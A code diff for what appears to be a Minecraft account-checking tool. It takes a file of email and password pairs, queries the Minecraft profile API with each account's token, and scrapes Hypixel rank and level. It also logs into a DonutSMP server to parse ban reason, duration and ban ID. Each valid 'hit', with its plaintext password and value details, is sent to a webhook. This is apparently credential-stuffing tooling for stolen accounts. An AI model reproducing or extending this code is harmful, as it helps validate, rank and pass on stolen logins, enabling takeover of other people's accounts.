@@ -87,7 +87,8 @@ def check_hypixel_stats(name):
         "level": "N/A",
         "first_login": "N/A",
         "last_login": "N/A",
-        "bw_stars": "N/A"
+        "bw_stars": "N/A",
+        "rank": "Default"
     }
     try:
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
@@ -104,6 +105,9 @@ def check_hypixel_stats(name):
         
         m_bw = re.search(r'<li><b>Level:</b> (.+?)</li>', tx)
         if m_bw: stats["bw_stars"] = m_bw.group(1)
+
+        m_rank = re.search(r'Rank:</b> <span[^>]*>(.*?)<\/span>', tx)
+        if m_rank: stats["rank"] = m_rank.group(1)
     except:
         pass
     return stats
@@ -125,7 +129,17 @@ def check_donutsmp_status(mc_name, mc_uuid, mc_token):
             except: msg = ""
             clean = extract_chat_text(msg)
             clean = re.sub(r'§.', '', clean)
-            ban_details = f"Banned: {clean.strip()}"
+            
+            reason_match = re.search(r'(You are .+?)(?:\\n|\n|$)', clean)
+            reason = reason_match.group(1).strip() if reason_match else clean.strip()
+            
+            time_match = re.search(r'(?:Time Left|Duration|Expires):?\s*([^\n\\]+)', clean, re.I)
+            time_left = time_match.group(1).strip() if time_match else "N/A"
+            
+            banid_match = re.search(r'Ban ID:?\s*#?([^\n\\]+)', clean, re.I)
+            ban_id = banid_match.group(1).strip() if banid_match else "N/A"
+            
+            ban_details = f"Banned | Reason: {reason} | Time Left: {time_left} | Ban ID: {ban_id}"
             result = "banned"
 
         @connection.listener(clientbound.login.LoginSuccessPacket, early=True)
@@ -208,9 +222,9 @@ def run(input_path, output_path, user_webhook=None):
         name = "Minecraft Account"
         player_uuid = ""
         cape_list = "None"
-        hypixel_stats = {"level": "N/A", "first_login": "N/A", "last_login": "N/A", "bw_stars": "N/A"}
+        hypixel_stats = {"level": "N/A", "first_login": "N/A", "last_login": "N/A", "bw_stars": "N/A", "rank": "Default"}
         donut_status = "Not Checked"
-
+      
         try:
             r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
             if r.status_code == 200:
@@ -227,8 +241,13 @@ def run(input_path, output_path, user_webhook=None):
                 # Fetch DonutSMP Ban Status via Socket
                 if player_uuid:
                     donut_status = check_donutsmp_status(name, player_uuid, token)
-        except:
-            pass
+            else:
+                name = "No Minecraft Java"
+                donut_status = "No Game Ownership"
+        except Exception as e:
+            name = "Profile Error"
+            donut_status = "Error"
+
         
         cap_block = (
             f"Email: {email}\n"
@@ -237,6 +256,7 @@ def run(input_path, output_path, user_webhook=None):
             f"UUID: {player_uuid}\n"
             f"Capes: {cape_list}\n"
             f"DonutSMP Status: {donut_status}\n"
+            f"Hypixel Rank: {hypixel_stats['rank']}\n"
             f"Hypixel Level: {hypixel_stats['level']}\n"
             f"BedWars Stars: {hypixel_stats['bw_stars']}\n"
             f"First Login: {hypixel_stats['first_login']}\n"
@@ -252,8 +272,12 @@ def run(input_path, output_path, user_webhook=None):
             send_hit_notification(
                 email=email,
                 password=password,
-                account_type="Minecraft Java (Donut & Hypixel Checked)",
+                account_type="Minecraft Java",
                 capes=cape_list,
+                hypixel_status="Checked",
+                hypixel_level=hypixel_stats['level'],
+                hypixel_rank=hypixel_stats['rank'],
+                donut_status=donut_status,
                 user_webhook_url=user_webhook
             )
         except Exception as e:
@@ -286,3 +310,4 @@ def run(input_path, output_path, user_webhook=None):
 
     with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
         out.writelines(final_output)
+            
